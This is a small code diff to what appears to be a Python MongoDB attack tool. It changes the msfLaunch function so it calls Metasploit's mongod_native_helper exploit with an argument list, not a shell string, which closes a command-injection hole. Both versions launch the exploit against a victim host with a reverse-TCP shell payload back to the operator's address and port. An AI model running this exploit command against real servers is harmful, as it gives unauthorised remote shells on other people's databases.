@@ -338,7 +338,7 @@ def enumDbs (mongoConn):
 
 def msfLaunch():
     try:
-        proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
+        proc = subprocess.call(["msfcli", "exploit/linux/misc/mongod_native_helper", "RHOST=%s" % victim, "DB=local", "PAYLOAD=linux/x86/shell/reverse_tcp", "LHOST=%s" % myIP, "LPORT=%s" % myPort, "E"])
 
     except:
         print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
